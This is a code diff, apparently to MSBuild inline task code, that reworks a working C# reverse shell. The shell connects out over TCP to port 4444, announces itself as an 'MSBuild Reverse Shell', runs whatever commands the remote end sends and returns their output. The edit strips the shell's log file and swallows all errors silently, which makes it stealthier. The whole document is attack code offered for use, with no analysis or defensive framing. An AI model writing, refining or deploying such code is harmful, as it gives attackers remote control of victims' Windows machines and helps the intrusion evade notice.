@@ -28,36 +28,49 @@
                 int port = 4444;
                 
                 try {
-                    File.WriteAllText("C:\\Windows\\Temp\\msbuild.log", "Starting connection to " + host + ":" + port);
-                    
                     using(TcpClient client = new TcpClient(host, port)) {
-                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnected! Setting up streams...");
-                        
-                        NetworkStream stream = client.GetStream();
-                        StreamReader reader = new StreamReader(stream);
-                        StreamWriter writer = new StreamWriter(stream);
-                        writer.AutoFlush = true;
-                        
-                        // Send initial prompt
-                        writer.WriteLine("=== MSBuild Reverse Shell Connected ===");
-                        writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
-                        
-                        string command;
-                        while(client.Connected && (command = reader.ReadLine()) != null) {
-                            File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nReceived command: " + command);
+                        using(NetworkStream stream = client.GetStream()) {
+                            // Send welcome message
+                            string welcome = "=== MSBuild Reverse Shell Connected ===\r\n";
+                            byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
+                            stream.Write(welcomeBytes, 0, welcomeBytes.Length);
                             
-                            if(command.Trim() == "exit") break;
-                            if(string.IsNullOrEmpty(command.Trim())) continue;
+                            string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
+                            byte[] promptBytes = Encoding.ASCII.GetBytes(prompt);
+                            stream.Write(promptBytes, 0, promptBytes.Length);
                             
-                            string result = ExecuteCommand(command.Trim());
-                            writer.Write(result);
-                            writer.Write("PS " + Directory.GetCurrentDirectory() + "> ");
+                            byte[] buffer = new byte[1024];
+                            
+                            // Main loop - keep connection alive
+                            while(client.Connected) {
+                                // Check if data is available (non-blocking)
+                                if(stream.DataAvailable) {
+                                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                                    if(bytesRead > 0) {
+                                        string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
+                                        
+                                        if(command == "exit") break;
+                                        if(string.IsNullOrEmpty(command)) continue;
+                                        
+                                        // Execute command
+                                        string result = ExecuteCommand(command);
+                                        
+                                        // Send result back
+                                        byte[] outputBytes = Encoding.ASCII.GetBytes(result);
+                                        stream.Write(outputBytes, 0, outputBytes.Length);
+                                        
+                                        // Send new prompt
+                                        stream.Write(promptBytes, 0, promptBytes.Length);
+                                    }
+                                }
+                                
+                                // Small delay to prevent CPU spinning
+                                Thread.Sleep(100);
+                            }
                         }
-                        
-                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnection closed normally");
                     }
-                } catch (Exception ex) {
-                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nError: " + ex.Message);
+                } catch (Exception) {
+                    // Silent fail
                 }
             }
             
@@ -77,12 +90,12 @@
                     process.WaitForExit();
                     
                     if(!string.IsNullOrEmpty(error)) {
-                        output += "\n" + error;
+                        output += "\r\n" + error;
                     }
                     
-                    return output;
+                    return output + "\r\n";
                 } catch(Exception ex) {
-                    return "Error: " + ex.Message + "\n";
+                    return "Error: " + ex.Message + "\r\n";
                 }
             }
         }
